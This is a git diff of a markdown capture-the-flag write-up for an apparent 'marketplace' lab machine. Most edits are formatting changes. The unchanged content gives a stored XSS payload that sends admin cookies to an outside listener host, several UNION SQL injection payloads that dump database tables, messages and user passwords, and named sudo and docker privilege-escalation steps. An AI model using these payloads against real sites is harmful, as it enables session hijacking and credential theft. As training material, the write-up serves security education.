@@ -14,7 +14,7 @@
 
 ## XSS
 
-> Test XSS 
+> Test `XSS` 
 
 ![](images/xss1.png)  
 
@@ -22,7 +22,7 @@
 
 ## Steal admin token
 
-> Make a new listing, change the description to the script, open a netcan listener and then report the listing to the admins
+> Make a `new listing`, change the `description` to the script, open a netcat listener and then `report` the listing to the admins
 ```JavaScript
 <script>new Image().src="http://10.11.19.194:1337/cookie.php?output="+document.cookie;</script>
 ```
@@ -32,51 +32,51 @@
 
 ## Hijack admin account
 
-> Edit token, change it to the admins token and refresh
+> Edit the session token and change it to the `admins token` and refresh
 > 
 ![](images/admin.png)
 
 ## Flag 1
 
-> Flag 1 is in the admin panel
+> Flag 1 is in the `admin panel`
 
 ![](images/flag1.png)
 
 ## SQL Injection
 
-> Produce an SQL error in the admin panel by changing the user id to '
+> Produce an SQL error in the admin panel by changing the `user id` to `
 
 ![](images/sql.png)
 
-> Open in burp
+>Capture the request and send it to the `repeater` in `BurpSuite`
 
 ![](images/burp.png)
 
-> There are 4 columns. 5 gets an error
+> There are `4` columns. 5 gets an error
 4 does not
 
 ![](images/4columns.png)
 
-> Show the database schema 
+> Show the database `schema` 
 ```SQL
 ''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,schema_name,0x7C),2,3,4+fRoM+information_schema.schemata--
 ```
 ![](images/schema.png)
 
-> Show the tables in the marketplace db
+> Show the `tables` in the `marketplace` db
 ```SQL
 ''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,table_name,0x7c),2,3,4+fRoM+information_schema.tables+wHeRe+table_schema='marketplace'--
 ```
 ![](images/marketplacedb.png)
 
-> Show the columns in the messages table
+> Show the `columns` in the `messages` `table`
 ```SQL
 ''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,column_name,0x7C),2,3,4+fRoM++information_schema.columns+wHeRe+table_name='messages'
 ```
 
 ![](images/messagetable.png)
 
-> User 1 sent user 3 a message with a new SSH password
+> User `1` sent user `3` a message with a new SSH password
 
 ```SQL
 ''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,':',user_to,':',user_from,':',message_content,0x7C,'\n\n'),2,3,4+fRoM+marketplace.messages
@@ -84,7 +84,7 @@
 
 ![](images/user3pass.png)
 
-> Get the ids by dumping the users table, user 1 is system and user 3 is jake.
+> Get the `id`s by dumping the `users` table, user `1` is `system` and user `3` is `jake`.
 ```SQL
 ''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,id,':',username,':',password,0x7C,'\n'),2,3,4+fRoM+marketplace.users
 ```
@@ -93,7 +93,7 @@
 
 ## SSH
 
-> SSH login to the jake user
+> SSH login as the `jake` user
 
 ![](images/ssh.png)
 
@@ -103,7 +103,7 @@
 
 ## PrivEsc
 
-> Michael can run a shell file called backup.sh as sudo, exploit this to get the michael user
+> `Michael` can run a shell file called `backup.sh` as sudo, exploit this to get the `michael` user.
 
 ![](images/sudo.png)
 
@@ -111,7 +111,7 @@
 
 ## Root
 
-> michael is in the docker group. Exploit docker to escalate to root
+> `michael` is in the `docker` group. Exploit `docker` to escalate to root.
 
 ![](images/root.png)
 
